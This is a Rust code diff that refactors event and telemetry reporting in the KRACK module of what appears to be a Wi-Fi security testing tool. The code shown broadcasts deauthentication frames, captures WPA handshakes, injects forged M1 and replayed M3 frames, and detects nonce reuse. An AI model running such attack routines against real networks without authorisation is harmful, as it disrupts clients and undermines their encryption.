@@ -35,8 +35,13 @@ use std::thread;
 use std::time::{Duration, Instant};
 
 use crate::adapter::SharedAdapter;
-use crate::core::{EventRing, MacAddress, TxFlags, TxOptions, TxRate};
+use crate::attacks::next_attack_id;
+use crate::core::{EventRing, MacAddress, TxOptions};
+use crate::core::chip::ChipCaps;
 use crate::store::Ap;
+use crate::store::update::{
+    AttackId, AttackType, AttackPhase, AttackEventKind, AttackResult, StoreUpdate,
+};
 use crate::protocol::frames;
 use crate::protocol::ieee80211::ReasonCode;
 
@@ -260,6 +265,21 @@ pub enum KrackPhase {
 
 impl Default for KrackPhase {
     fn default() -> Self { Self::Idle }
+}
+
+impl KrackPhase {
+    /// Convert to the normalized AttackPhase for delta emission.
+    fn to_attack_phase(&self) -> AttackPhase {
+        match self {
+            Self::Idle => AttackPhase { label: "Idle", is_active: false, is_terminal: false },
+            Self::ChannelLock => AttackPhase { label: "ChannelLock", is_active: true, is_terminal: false },
+            Self::DeauthSent => AttackPhase { label: "DeauthSent", is_active: true, is_terminal: false },
+            Self::CapturingHandshake => AttackPhase { label: "CapturingHandshake", is_active: true, is_terminal: false },
+            Self::Replaying => AttackPhase { label: "Replaying", is_active: true, is_terminal: false },
+            Self::Monitoring => AttackPhase { label: "Monitoring", is_active: true, is_terminal: false },
+            Self::Done => AttackPhase { label: "Done", is_active: false, is_terminal: true },
+        }
+    }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -527,37 +547,46 @@ fn run_krack_attack(
     running: &Arc<AtomicBool>,
 ) {
     let start = Instant::now();
+    let mut wait_time = Duration::ZERO;
     let _our_mac = shared.mac();
     let tx_fb = shared.tx_feedback();
     tx_fb.reset();
-    // TX options optimized for range — own MAC so ACK feedback works
-    let tx_opts = TxOptions {
-        rate: if target.channel <= 14 { TxRate::Cck1m } else { TxRate::Ofdm6m },
-        retries: 12,
-        flags: TxFlags::WANT_ACK | TxFlags::LDPC | TxFlags::STBC,
-        ..Default::default()
-    };
+    let attack_id = next_attack_id();
 
-    push_event(events, start, KrackEventKind::AttackStarted {
+    // Emit AttackStarted
+    shared.emit_updates(vec![StoreUpdate::AttackStarted {
+        id: attack_id,
+        attack_type: AttackType::Krack,
+        target_bssid: target.bssid,
+        target_ssid: target.ssid.clone(),
+        target_channel: target.channel,
+    }]);
+
+    // TX options: max range + ACK feedback, chip-aware rate selection
+    let has_he = shared.caps().contains(ChipCaps::HE);
+    let tx_opts = TxOptions::max_range_ack(target.channel, has_he);
+
+    push_event(shared, events, start, KrackEventKind::AttackStarted {
         bssid: target.bssid,
         ssid: target.ssid.clone(),
         channel: target.channel,
         variant_count: variants.len() as u32,
-    });
+    }, attack_id);
 
     // Lock channel
     if let Err(e) = shared.lock_channel(target.channel, "krack") {
-        push_event(events, start, KrackEventKind::Error {
+        push_event(shared, events, start, KrackEventKind::Error {
             message: format!("channel lock to ch{} failed: {e}", target.channel),
-        });
+        }, attack_id);
         return;
     }
-    push_event(events, start, KrackEventKind::ChannelLocked { channel: target.channel });
-    thread::sleep(params.channel_settle);
+    push_event(shared, events, start, KrackEventKind::ChannelLocked { channel: target.channel }, attack_id);
+    let t = Instant::now(); thread::sleep(params.channel_settle); wait_time += t.elapsed();
+
 
     // Step 1: Deauth client to force reconnection (if configured)
     if params.deauth_to_reconnect {
-        update_phase(info, KrackPhase::DeauthSent);
+        update_phase(shared, info, KrackPhase::DeauthSent, attack_id);
         // Broadcast deauth from AP to kick all clients
         for _ in 0..params.deauth_count {
             if !running.load(Ordering::SeqCst) { break; }
@@ -570,25 +599,25 @@ fn run_krack_attack(
                 info.frames_sent += 1;
                 info.deauths_sent += 1;
             }
-            thread::sleep(params.deauth_delay);
+            let t = Instant::now(); thread::sleep(params.deauth_delay); wait_time += t.elapsed();
         }
-        push_event(events, start, KrackEventKind::DeauthSent {
+        push_event(shared, events, start, KrackEventKind::DeauthSent {
             target: MacAddress::BROADCAST,
             count: params.deauth_count,
-        });
+        }, attack_id);
     }
 
     // Step 2: Capture 4-way handshake
-    update_phase(info, KrackPhase::CapturingHandshake);
+    update_phase(shared, info, KrackPhase::CapturingHandshake, attack_id);
     let mut captured = CapturedFrames::default();
     let capture_ok = capture_handshake(
-        reader, &target.bssid, params, &mut captured,
-        info, events, running, start,
+        shared, reader, &target.bssid, params, &mut captured,
+        info, events, running, start, attack_id, &mut wait_time,
     );
 
     if !capture_ok && !running.load(Ordering::SeqCst) {
         shared.unlock_channel();
-        push_event(events, start, KrackEventKind::ChannelUnlocked);
+        push_event(shared, events, start, KrackEventKind::ChannelUnlocked, attack_id);
         return;
     }
 
@@ -600,11 +629,11 @@ fn run_krack_attack(
     }
 
     if handshake_ok {
-        push_event(events, start, KrackEventKind::HandshakeCaptured {
+        push_event(shared, events, start, KrackEventKind::HandshakeCaptured {
             has_m1: captured.m1.is_some(),
             has_m3: true,
             has_group_m1: captured.group_m1.is_some(),
-        });
+        }, attack_id);
     }
 
     // Step 3: Execute variants
@@ -623,11 +652,11 @@ fn run_krack_attack(
             info.elapsed = start.elapsed();
         }
 
-        push_event(events, start, KrackEventKind::VariantStarted {
+        push_event(shared, events, start, KrackEventKind::VariantStarted {
             variant: *variant,
             index: idx as u32 + 1,
             total: variants.len() as u32,
-        });
+        }, attack_id);
 
         // Check if we have the required frame
         let can_test = match variant {
@@ -642,10 +671,10 @@ fn run_krack_attack(
 
         if !can_test {
             let reason = format!("{} not captured — required frame not seen", variant.replay_frame());
-            push_event(events, start, KrackEventKind::VariantSkipped {
+            push_event(shared, events, start, KrackEventKind::VariantSkipped {
                 variant: *variant,
                 reason: reason.clone(),
-            });
+            }, attack_id);
             total_skipped += 1;
             {
                 let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
@@ -655,16 +684,16 @@ fn run_krack_attack(
                     r.detail = reason;
                 }
             }
-            push_event(events, start, KrackEventKind::VariantComplete {
+            push_event(shared, events, start, KrackEventKind::VariantComplete {
                 variant: *variant, verdict: KrackVerdict::Skipped,
                 nonce_reuses: 0, elapsed_ms: 0,
-            });
+            }, attack_id);
             continue;
         }
 
         let result = test_variant(
             shared, reader, &target.bssid, *variant, params, &captured,
-            info, events, running, start, &tx_opts,
+            info, events, running, start, &tx_opts, attack_id, &mut wait_time,
         );
 
         total_tested += 1;
@@ -682,12 +711,15 @@ fn run_krack_attack(
             }
         }
 
-        push_event(events, start, KrackEventKind::VariantComplete {
+        push_event(shared, events, start, KrackEventKind::VariantComplete {
             variant: *variant,
             verdict: result.verdict,
             nonce_reuses: result.nonce_reuses,
             elapsed_ms: result.elapsed.as_millis() as u64,
-        });
+        }, attack_id);
+
+        // Emit counters after each variant (natural batch point)
+        emit_counters(shared, attack_id, info, start, &tx_fb);
 
         // For 4-way variants after the first, we'd ideally recapture the handshake.
         // In TEST mode, we deauth again to get a fresh handshake for the next variant.
@@ -702,15 +734,15 @@ fn run_krack_attack(
                         ReasonCode::Class3FromNonAssoc,
                     );
                     let _ = shared.tx_frame(&deauth, &tx_opts);
-                    thread::sleep(params.deauth_delay);
+                    let t = Instant::now(); thread::sleep(params.deauth_delay); wait_time += t.elapsed();
                 }
 
                 // Re-capture handshake
-                update_phase(info, KrackPhase::CapturingHandshake);
+                update_phase(shared, info, KrackPhase::CapturingHandshake, attack_id);
                 let mut new_captured = CapturedFrames::default();
                 let ok = capture_handshake(
-                    reader, &target.bssid, params, &mut new_captured,
-                    info, events, running, start,
+                    shared, reader, &target.bssid, params, &mut new_captured,
+                    info, events, running, start, attack_id, &mut wait_time,
                 );
                 if ok && new_captured.m3.is_some() {
                     captured.m1 = new_captured.m1;
@@ -725,23 +757,39 @@ fn run_krack_attack(
     }
 
     shared.unlock_channel();
-    push_event(events, start, KrackEventKind::ChannelUnlocked);
+    push_event(shared, events, start, KrackEventKind::ChannelUnlocked, attack_id);
 
     let elapsed = start.elapsed();
-    push_event(events, start, KrackEventKind::AttackComplete {
+    push_event(shared, events, start, KrackEventKind::AttackComplete {
         tested: total_tested, vulnerable: total_vulnerable,
         skipped: total_skipped, total: variants.len() as u32, elapsed,
-    });
+    }, attack_id);
 
     {
         let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
         info.elapsed = elapsed;
-        let secs = elapsed.as_secs_f64();
+        let active = elapsed.saturating_sub(wait_time);
+        let secs = active.as_secs_f64();
         if secs > 0.0 {
             info.frames_per_sec = (info.frames_sent + info.frames_received) as f64 / secs;
         }
         info.tx_feedback = tx_fb.snapshot();
     }
+
+    // Emit AttackComplete with final results
+    let results = {
+        let info = info.lock().unwrap_or_else(|e| e.into_inner());
+        info.results.clone()
+    };
+    shared.emit_updates(vec![StoreUpdate::AttackComplete {
+        id: attack_id,
+        attack_type: AttackType::Krack,
+        result: AttackResult::Krack {
+            tested: total_tested,
+            vulnerable: total_vulnerable,
+            results,
+        },
+    }]);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -751,6 +799,7 @@ fn run_krack_attack(
 /// Capture a 4-way handshake by monitoring EAPOL frames.
 /// Returns true if at least M3 was captured.
 fn capture_handshake(
+    shared: &SharedAdapter,
     reader: &crate::pipeline::PipelineSubscriber,
     bssid: &MacAddress,
     params: &KrackParams,
@@ -759,6 +808,8 @@ fn capture_handshake(
     events: &Arc<EventRing<KrackEvent>>,
     running: &Arc<AtomicBool>,
     attack_start: Instant,
+    attack_id: AttackId,
+    wait_time: &mut Duration,
 ) -> bool {
     let deadline = Instant::now() + params.handshake_timeout;
     let bssid_bytes = bssid.as_bytes();
@@ -770,6 +821,7 @@ fn capture_handshake(
         let remaining = deadline - now;
         let rx_timeout = remaining.min(params.rx_poll_timeout);
 
+        let t = Instant::now();
         match reader.recv_timeout(rx_timeout) {
             Some(frame) => {
                 {
@@ -780,10 +832,10 @@ fn capture_handshake(
 
                 // Check for EAPOL data frames involving our AP
                 if let Some(msg_num) = extract_eapol_message(&frame.raw, bssid_bytes) {
-                    push_event(events, attack_start, KrackEventKind::HandshakeMessage {
+                    push_event(shared, events, attack_start, KrackEventKind::HandshakeMessage {
                         message: msg_num,
                         from_ap: msg_num == 1 || msg_num == 3 || msg_num == 5,
-                    });
+                    }, attack_id);
 
                     match msg_num {
                         1 => {
@@ -796,9 +848,9 @@ fn capture_handshake(
                             if captured.client_mac.is_none() {
                                 if let Some(client) = frame.addr1 {
                                     captured.client_mac = Some(client);
-                                    push_event(events, attack_start, KrackEventKind::ClientLocked {
+                                    push_event(shared, events, attack_start, KrackEventKind::ClientLocked {
                                         mac: client,
-                                    });
+                                    }, attack_id);
                                     let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                                     info.client_mac = Some(client);
                                 }
@@ -825,7 +877,7 @@ fn capture_handshake(
                     }
                 }
             }
-            None => continue,
+            None => { *wait_time += t.elapsed(); continue; }
         }
     }
 
@@ -912,12 +964,14 @@ fn test_variant(
     running: &Arc<AtomicBool>,
     attack_start: Instant,
     tx_opts: &TxOptions,
+    attack_id: AttackId,
+    wait_time: &mut Duration,
 ) -> KrackTestResult {
     let test_start = Instant::now();
     let mut result = KrackTestResult::new(variant);
     result.verdict = KrackVerdict::Testing;
 
-    update_phase(info, KrackPhase::Replaying);
+    update_phase(shared, info, KrackPhase::Replaying, attack_id);
 
     // For zeroed-TK, inject forged M1 first
     if variant == KrackVariant::ZeroedTk {
@@ -925,7 +979,7 @@ fn test_variant(
             let _ = shared.tx_frame(m1, tx_opts);
             let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
             info.frames_sent += 1;
-            thread::sleep(Duration::from_millis(10));
+            let t = Instant::now(); thread::sleep(Duration::from_millis(10)); *wait_time += t.elapsed();
         }
     }
 
@@ -964,22 +1018,23 @@ fn test_variant(
         }
 
         if i < params.m3_replay_count - 1 && params.m3_replay_delay > Duration::ZERO {
-            thread::sleep(params.m3_replay_delay);
+            let t = Instant::now(); thread::sleep(params.m3_replay_delay); *wait_time += t.elapsed();
         }
     }
 
     result.replays_sent = replays_sent;
 
-    push_event(events, attack_start, KrackEventKind::M3Replayed {
+    push_event(shared, events, attack_start, KrackEventKind::M3Replayed {
         variant,
         count: replays_sent,
-    });
+    }, attack_id);
 
     // Monitor for nonce reuse (PN going backwards in encrypted frames)
-    update_phase(info, KrackPhase::Monitoring);
+    update_phase(shared, info, KrackPhase::Monitoring, attack_id);
     let nonce_reuses = monitor_nonce_reuse(
-        reader, bssid, captured.client_mac.as_ref(),
-        params, info, events, running, attack_start, variant,
+        shared, reader, bssid, captured.client_mac.as_ref(),
+        params, info, events, running, attack_start, variant, attack_id,
+        wait_time,
     );
 
     result.nonce_reuses = nonce_reuses;
@@ -1006,6 +1061,7 @@ fn test_variant(
 /// After M3 replay, if the client reinstalls the PTK, it resets its PN counter.
 /// We detect this by watching for PN values that go backwards.
 fn monitor_nonce_reuse(
+    shared: &SharedAdapter,
     reader: &crate::pipeline::PipelineSubscriber,
     _bssid: &MacAddress,
     client_mac: Option<&MacAddress>,
@@ -1015,6 +1071,8 @@ fn monitor_nonce_reuse(
     running: &Arc<AtomicBool>,
     attack_start: Instant,
     variant: KrackVariant,
+    attack_id: AttackId,
+    wait_time: &mut Duration,
 ) -> u32 {
     let deadline = Instant::now() + params.monitor_duration;
     let mut last_pn: u64 = 0;
@@ -1028,6 +1086,7 @@ fn monitor_nonce_reuse(
         let remaining = deadline - now;
         let rx_timeout = remaining.min(params.rx_poll_timeout);
 
+        let t = Instant::now();
         match reader.recv_timeout(rx_timeout) {
             Some(frame) => {
                 {
@@ -1073,19 +1132,19 @@ fn monitor_nonce_reuse(
                     // PN went backwards — nonce reuse!
                     reuses += 1;
 
-                    push_event(events, attack_start, KrackEventKind::NonceReuse {
+                    push_event(shared, events, attack_start, KrackEventKind::NonceReuse {
                         variant,
                         old_pn: last_pn,
                         new_pn: pn,
                         count: reuses,
-                    });
+                    }, attack_id);
 
                     last_pn = pn;
                 } else {
                     last_pn = pn;
                 }
             }
-            None => continue,
+            None => { *wait_time += t.elapsed(); continue; }
         }
     }
 
@@ -1096,15 +1155,62 @@ fn monitor_nonce_reuse(
 //  Helpers
 // ═══════════════════════════════════════════════════════════════════════════════
 
-fn push_event(events: &Arc<EventRing<KrackEvent>>, start: Instant, kind: KrackEventKind) {
+fn push_event(
+    shared: &SharedAdapter,
+    events: &Arc<EventRing<KrackEvent>>,
+    start: Instant,
+    kind: KrackEventKind,
+    attack_id: AttackId,
+) {
     let seq = events.seq() + 1;
-    events.push(KrackEvent { seq, timestamp: start.elapsed(), kind });
+    let timestamp = start.elapsed();
+
+    // Emit into the delta stream
+    shared.emit_updates(vec![StoreUpdate::AttackEvent {
+        id: attack_id,
+        seq,
+        timestamp,
+        event: AttackEventKind::Krack(kind.clone()),
+    }]);
+
+    // Push to legacy EventRing (still consumed by CLI polling path)
+    events.push(KrackEvent { seq, timestamp, kind });
 }
 
-fn update_phase(info: &Arc<Mutex<KrackInfo>>, phase: KrackPhase) {
+fn update_phase(
+    shared: &SharedAdapter,
+    info: &Arc<Mutex<KrackInfo>>,
+    phase: KrackPhase,
+    attack_id: AttackId,
+) {
+    // Emit phase change into the delta stream
+    shared.emit_updates(vec![StoreUpdate::AttackPhaseChanged {
+        id: attack_id,
+        phase: phase.to_attack_phase(),
+    }]);
+
+    // Update legacy Info struct (still consumed by CLI polling path)
     let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
     info.phase = phase;
     info.elapsed = info.start_time.elapsed();
+}
+
+fn emit_counters(
+    shared: &SharedAdapter,
+    attack_id: AttackId,
+    info: &Arc<Mutex<KrackInfo>>,
+    start: Instant,
+    tx_fb: &Arc<crate::core::TxFeedback>,
+) {
+    let info = info.lock().unwrap_or_else(|e| e.into_inner());
+    shared.emit_updates(vec![StoreUpdate::AttackCountersUpdate {
+        id: attack_id,
+        frames_sent: info.frames_sent,
+        frames_received: info.frames_received,
+        frames_per_sec: info.frames_per_sec,
+        elapsed: start.elapsed(),
+        tx_feedback: tx_fb.snapshot(),
+    }]);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
